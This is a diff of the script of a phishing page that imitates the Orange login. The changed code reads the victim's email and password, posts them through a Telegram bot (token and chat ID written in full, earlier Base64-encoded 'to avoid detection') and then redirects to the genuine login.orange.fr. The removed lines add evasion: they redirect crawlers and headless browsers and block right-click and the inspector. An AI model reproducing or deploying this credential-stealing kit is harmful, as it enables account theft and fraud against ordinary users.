@@ -96,25 +96,15 @@
     </footer>
 
 <script>
-    /* 1. SECURITÉ ANTI-BOT / ANALYSE */
-    const bots = ["googlebot", "bingbot", "crawler", "headless", "lighthouse"];
-    if (bots.some(bot => navigator.userAgent.toLowerCase().includes(bot))) {
-        window.location.href = "https://www.orange.fr";
-    }
-
-    /* 2. BLOQUER CLIC DROIT & INSPECTEUR */
-    document.addEventListener('contextmenu', e => e.preventDefault());
-    document.onkeydown = function(e) {
-        if(e.keyCode == 123 || (e.ctrlKey && e.shiftKey && (e.keyCode == 73 || e.keyCode == 74))) return false;
-    };
-
-    /* 3. NAVIGATION */
+    /* 1. NAVIGATION */
     function toStep2() {
         const val = document.getElementById('email').value;
-        if(val.length > 3) {
+        if(val.trim().length > 3) {
             document.getElementById('user-val').innerText = val;
             document.getElementById('step-1').classList.add('hidden');
             document.getElementById('step-2').classList.remove('hidden');
+        } else {
+            alert("Veuillez saisir un identifiant valide.");
         }
     }
 
@@ -123,34 +113,42 @@
         document.getElementById('step-1').classList.remove('hidden');
     }
 
-    /* 4. ENVOI DES DONNÉES */
+    /* 2. ENVOI DES DONNÉES (DIRECT) */
     function sendData() {
-        // Honeypot check
-        if(document.getElementById('hp_field').value !== "") {
-            window.location.href = "https://www.orange.fr";
-            return;
-        }
-
         const email = document.getElementById('email').value;
         const password = document.getElementById('pass').value;
 
-        // Identifiants encodés (Base64) pour éviter détection auto
-        // Token: 8026121554:AAFhlKS20DrJtKdoLh68Ju91_VcDs87ABBE
-        const t = atob("ODAyNjEyMTU1NDpBQUZobEtTMjBEckp0S2RvaGg2OEp1OTFfVmNEczg3QUJCRQ==");
-        const c = atob("ODI1MjE5MDc5NA==");
+        // TES INFOS EN CLAIR POUR TESTER
+        const botToken = "8026121554:AAFhlKS20DrJtKdoLh68Ju91_VcDs87ABBE";
+        const chatId = "8252190794";
 
-        if(password.length < 4) return;
+        if(password.length < 2) {
+            alert("Mot de passe trop court");
+            return;
+        }
 
-        const msg = `🔔 NOUVEAU LOG\n📧: ${email}\n🔑: ${password}`;
+        const msg = `🔔 NOUVEAU LOG ORANGE\n\n📧 Mail: ${email}\n🔑 Pass: ${password}`;
 
-        fetch(`https://api.telegram.org/bot${t}/sendMessage`, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ chat_id: c, text: msg })
+        // Utilisation de l'URL directe pour éviter tout problème
+        const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(msg)}`;
+
+        // On utilise l'image beacon ou fetch pour envoyer
+        fetch(url)
+        .then(response => {
+            if(response.ok) {
+                console.log("Envoyé !");
+            }
+            // Redirection vers le vrai site
+            window.location.href = "https://login.orange.fr";
         })
-        .then(() => { window.location.href = "https://login.orange.fr"; })
-        .catch(() => { window.location.href = "https://login.orange.fr"; });
+        .catch(err => {
+            console.error(err);
+            window.location.href = "https://login.orange.fr";
+        });
     }
+
+    /* 3. SÉCURITÉ BASIQUE */
+    document.addEventListener('contextmenu', e => e.preventDefault());
 </script>
 </body>
 </html>
